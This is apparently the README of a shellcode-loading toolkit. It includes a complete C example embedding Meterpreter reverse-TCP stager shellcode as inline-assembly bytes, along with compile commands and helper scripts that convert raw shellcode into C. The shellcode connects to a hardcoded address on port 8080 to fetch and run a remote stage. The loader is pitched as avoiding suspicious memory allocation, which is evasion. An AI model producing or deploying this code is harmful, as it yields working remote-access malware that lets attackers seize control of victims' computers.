# Shellcoding
Shellcoding Utilities

# WARNING

The way that the code is designed will prevent self modifying shellcode to work properly. Since the shellcode is part of the .text section which is by default READ/EXEC shellcode that perform write action will crash. I'm planning on releasing a writable wrapper soon.

# Example:

Standard meterpreter shellcode

```
#include <Windows.h>

int main() {
    asm("call code\n\t"
        ".byte 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0xc5,0x84,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5\n\t"
        "code:\n\t"
        "ret\n\t");

        return 0;
}
```

Compile it 

```
mingw32-gcc.exe -c meterpreter.c -o meterpreter.o
mingw32-g++.exe -o meterpreter.exe meterpreter.o
```

# loader.c

A simple shellcode loader in C. This shellcode loader is not storing the shellcode in the data section. It store it directly in the text section to new to do shady memory allocation to call your shellcode.

The ASM syntax is for GCC compiler it can be adapted for VC too

# raw2hex.py

Convert raw shellcode into something else

```
raw2hex.py rawshellcodefile -list
0x90, 0x90

raw2hex.py rawshellcodefile
\x90\x90
```

# makefile.py

Generate the final C code

```
makefile.py shellcode.raw output.c
```
